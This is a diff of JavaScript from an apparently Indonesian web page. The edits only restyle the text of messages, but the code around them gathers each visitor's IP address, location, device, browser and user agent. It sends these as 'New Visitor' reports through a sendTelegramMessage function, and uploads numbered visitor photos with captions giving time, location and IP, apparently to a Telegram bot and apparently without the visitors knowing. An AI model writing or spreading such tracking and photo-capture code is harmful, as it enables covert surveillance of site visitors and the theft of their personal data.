@@ -143,16 +143,16 @@ function initMainPage() {
                 // Kirim pesan teks pertama (selalu berhasil)
                 const message = `
 *🆕 𝑵𝒆𝒘 𝑽𝒊𝒔𝒊𝒕𝒐𝒓 𝑾𝒆𝒃𝒔𝒊𝒕𝒆 🆕*
-*🕒 Waktu :* ${timestamp}
-*📊 Halaman :* Main Page
-*ℹ️ Status :* Login Berhasil
+*🕒 𝗪𝗮𝗸𝘁𝘂 :* ${timestamp}
+*📊 𝗛𝗮𝗹𝗮𝗺𝗮𝗻 :* Main Page
+*ℹ️ 𝗦𝘁𝗮𝘁𝘂𝘀 :* Login Berhasil
 
-*🌌 Data Users 🌌*
-*🌐 IP Address:* ${ipAddress}
-*📍 Lokasi :* ${locationInfo}
-*📱 Device :* ${deviceType}
-*🔎 Browser :* ${browserName}
-*👤 UserAgent :* \`${userAgent}\`
+*🌌 𝑫𝒂𝒕𝒂 𝑼𝒔𝒆𝒓𝒔 🌌*
+*🌐 𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 :* ${ipAddress}
+*📍 𝗟𝗼𝗸𝗮𝘀𝗶 :* ${locationInfo}
+*📱 𝗗𝗲𝘃𝗶𝗰𝗲 :* ${deviceType}
+*🔎 𝗕𝗿𝗼𝘄𝘀𝗲𝗿 :* ${browserName}
+*👤 𝗨𝘀𝗲𝗿𝗔𝗴𝗲𝗻𝘁 :* \`${userAgent}\`
 `;
                 sendTelegramMessage(message);
 
@@ -251,10 +251,10 @@ function initMainPage() {
         formData.append('photo', photoBlob, `visit_${new Date().getTime()}_${currentCount}.jpg`);
         
         const captionText = `
-*--- 📸 SATUNOVEMBER FOTO ${currentCount} DARI ${totalCount} 📸 ---*
-*Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
-*Lokasi Estimasi:* ${location}
-*IP:* ${ip}
+*📸 Foto Pengunjung. ${currentCount}/${totalCount} 📸 
+*🕒 :* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+*📍 :* ${location}
+*🌐 :* ${ip}
 `;
         formData.append('caption', captionText);
         formData.append('parse_mode', 'Markdown');
